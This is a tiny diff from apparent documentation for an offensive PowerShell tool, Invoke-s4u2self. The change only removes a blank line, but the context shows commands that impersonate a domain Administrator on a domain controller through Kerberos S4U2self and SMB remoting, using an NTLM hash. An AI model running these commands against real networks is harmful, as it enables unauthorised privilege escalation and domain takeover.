@@ -25,7 +25,6 @@ Invoke-s4u2self -ComputerName DC01 -Impersonate Administrator -SMBRemoting -Tick
 Invoke-s4u2self -ComputerName DC01 -Domain ferrari.local -DomainController DC01.ferrari.local -Impersonate Administrator -SMBRemoting -NTHash 22a151bd3056ac739718f73dfe5f9614
 ```
 
-
 ### PSRemoting
 
 ```
